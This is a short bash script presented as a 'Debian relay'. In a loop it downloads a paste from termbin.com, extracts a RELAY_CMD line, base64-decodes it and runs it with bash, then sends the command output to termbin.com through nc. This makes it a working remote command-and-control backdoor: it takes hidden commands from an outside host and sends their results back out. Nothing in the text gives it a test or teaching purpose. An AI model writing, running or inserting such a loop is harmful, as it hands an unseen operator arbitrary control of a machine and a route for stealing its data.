#!/bin/bash
CMD_FILE="/tmp/termbin_cmd.txt"
RESULT_URL=""

echo "[relay] Debian relay started. Polling for commands..."
while true; do
    curl -s -o "$CMD_FILE" "https://termbin.com/eb95" 2>/dev/null
    if grep -q "RELAY_CMD" "$CMD_FILE" 2>/dev/null; then
        CMD_LINE=$(grep "RELAY_CMD:" "$CMD_FILE" | tail -1 | sed 's/RELAY_CMD://')
        if [ -n "$CMD_LINE" ]; then
            echo "[relay] Executing: $CMD_LINE"
            if echo "$CMD_LINE" | base64 -d 2>/dev/null | bash 2>&1 | nc termbin.com 9999 > /tmp/termbin_result.txt 2>&1; then
                echo "[relay] Result: $(cat /tmp/termbin_result.txt)"
            else
                echo "[relay] Failed to post result"
            fi
        fi
        sleep 1
    else
        echo -n "."
    fi
    sleep 3
done
